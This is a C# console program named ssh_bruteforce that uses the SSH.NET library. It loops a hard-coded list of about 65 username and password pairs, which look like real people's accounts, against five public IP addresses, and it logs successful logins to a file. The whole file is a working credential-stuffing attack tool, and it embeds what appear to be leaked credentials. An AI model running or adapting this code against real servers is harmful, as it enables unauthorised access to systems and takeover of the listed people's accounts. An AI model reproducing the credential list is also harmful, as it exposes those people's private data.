using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Renci.SshNet;
using System.IO;

namespace ssh_bruteforce
{
    class Program
    {
        static void Main(string[] args)
        {
            List<UserPassCombo> combos = new List<UserPassCombo>() { new UserPassCombo("frederick.kruger", "c8uRH8bFLOTl1aR"), new UserPassCombo("jhendricks", "oXwBJMtx3BJ5yKg"), new UserPassCombo("wscott", "oTLhoRZ8JOIDhkD"), new UserPassCombo("rhartley", "QBhHAp3qoitn2U2"), new UserPassCombo("daniel.gallucci", "tIwwzW5mQVYsIP5"), new UserPassCombo("karen.winters", "sQAgkU44G52uL3U"), new UserPassCombo("mary.bowman", "etSRyQ55Qcjm6Yd"), new UserPassCombo("cheryl.boyd", "Ybjad2v2RRbhYgX"), new UserPassCombo("melissa.kim", "JtRjjn3NYlnddeI"), new UserPassCombo("kmcdonald", "2zcrvMynUBkJHka"), new UserPassCombo("glopez", "XXsl5Eml8cZmXJK"), new UserPassCombo("jay.kemper", "YeFIpx4YHyk8JPf"), new UserPassCombo("msmith", "2JYi20TsXe71d3d"), new UserPassCombo("alfonzo.baker", "S4lJL9CDpCzIrmN"), new UserPassCombo("jholloman", "EcHPqndPepuPIlv"), new UserPassCombo("rebecca.monroe", "OHZDkWb6ZcUXFH1"), new UserPassCombo("lrodriguez", "xAmFVMtDESWILp5"), new UserPassCombo("afield", "ZAKNmJLKa2JiNtJ"), new UserPassCombo("erobinson", "umnHh9KoVuwERWA"), new UserPassCombo("mroth", "4W21wJjuXBwHTp3"), new UserPassCombo("swalker", "2fDzFjHr6LL9Uwd"), new UserPassCombo("jrogers", "KKgYquNxcIfOKbR"), new UserPassCombo("yvette.akers", "nPekJbSNjhEW0tF"), new UserPassCombo("william.galeano", "xB1CdaLyoDOk0n7"), new UserPassCombo("albert.black", "4VOG0jBJxwtuTWf"), new UserPassCombo("earl.roop", "9K7sihV26wQMdZB"), new UserPassCombo("cjames", "z6pOdu4skUf13pt"), new UserPassCombo("raymond.okelly", "RkuK3EHv8Bpn6YM"), new UserPassCombo("gilbert.palafox", "BhdL5nRawFkeBV3"), new UserPassCombo("ghunt", "ptFWjZ6XYbEeJAj"), new UserPassCombo("teresa.green", "5TlgcBclUKKyA7m"), new UserPassCombo("sarmesto", "lCS4hjr0o9c4fnr"), new UserPassCombo("rdodson", "xIhKOHTxSTS8Olh"), new UserPassCombo("jsaylor", "iFh7iTDVyf5mtMU"), new UserPassCombo("phillip.johnson", "lu7EwEVESpLPx7d"), new UserPassCombo("jrodriguez", "vdhCkmHUA4CAMYg"), new UserPassCombo("fvereen", "1VUkwexS4Fg9Qmb"), new UserPassCombo("paul.webster", "d0VZuRdHOQfQwo9"), new UserPassCombo("allen.bostick", "N9pCNt3fRP4lqTe"), new UserPassCombo("jim.looney", "B9MikfY4tgTScw2"), new UserPassCombo("debra.devries", "xnDPffZURAahekL"), new UserPassCombo("sthomas", "4XCpLmBzDvgq0ms"), new UserPassCombo("noah.cotto", "STyCGRhOiwK8gQd"), new UserPassCombo("ljohnson", "l4wWYPi24xpJw5L"), new UserPassCombo("edward.roberts", "nzGDg7z2Yl9F4fe"), new UserPassCombo("debbie.oneal", "VnOJpV4EcqhDPZx"), new UserPassCombo("james.young", "Uj2lc5SV45kj7AK"), new UserPassCombo("maryrose.harris", "XhaAhmPJcZMS7q0"), new UserPassCombo("alma.vanhook", "xhDuRTf9ymagqYU"), new UserPassCombo("jsilvers", "xfIApadnX4CYAUS"), new UserPassCombo("destrada", "Cl6rBmYXi16hI2j"), new UserPassCombo("xavier.johnson", "w0JfuMEQo7BQgQJ"), new UserPassCombo("jennifer.diaz", "ddgBUc6VGbNOn9X"), new UserPassCombo("joseph.ybarra", "fBCbQKwgTysb6r7"), new UserPassCombo("cmcelroy", "3F9OQodF3fukAOa"), new UserPassCombo("dtickle", "VoxCWFthhncqKfh"), new UserPassCombo("dmurphy", "xehEqtvVWSuvwsr"), new UserPassCombo("gstephenson", "qF5Nme48L9asr7m"), new UserPassCombo("michael.murray", "c5cYh1ll7z4OuxE"), new UserPassCombo("nprewitt", "tLstRvZ25saYrqj"), new UserPassCombo("tmccreary", "wBN24pPK8IvpaSB"), new UserPassCombo("estela.ware", "tQ6gd1VKozTaLsF"), new UserPassCombo("cynthia.hebert", "A8btuv1IzMVaDsA"), new UserPassCombo("btaylor", "cYN3z1ILAjLFav7"), new UserPassCombo("wcomacho", "4JVGyQGUZAI4NfB") };
            List<string> servers = new List<string>() { "104.236.251.33", "45.55.179.181", "45.55.183.167", "45.55.47.192", "104.131.109.3" };
            string path_to_file = @"./GOOD.txt";
            
            foreach (string s in servers)
            {
                foreach (UserPassCombo c in combos)
                {
                    using (var client = new SshClient(s, c.name, c.password))
                    {
                        try
                        {
                            client.Connect();
                            Console.WriteLine("PASSED: " + c.name + "@" + s + ", pw " + c.password);
                            StreamWriter file = new StreamWriter(path_to_file);
                            file.WriteLine("PASSED: " + c.name + "@" + s + ", pw " + c.password);
                            file.Close();
                            client.Disconnect();
                        }
                        catch
                        {
                            Console.WriteLine("FAILED: " + c.name + "@" + s + ", pw " + c.password);
                        }
                        
                    }
                }
            }
            
            Console.WriteLine("DONE - PRESS ANY KEY TO EXIT");
            Console.ReadLine();
            
        }
    }

    class UserPassCombo
    {
        public UserPassCombo(string name, string password)
        {
            this.name = name;
            this.password = password;
        }

        public string name { get; set; }
        public string password { get; set; }
    }
}
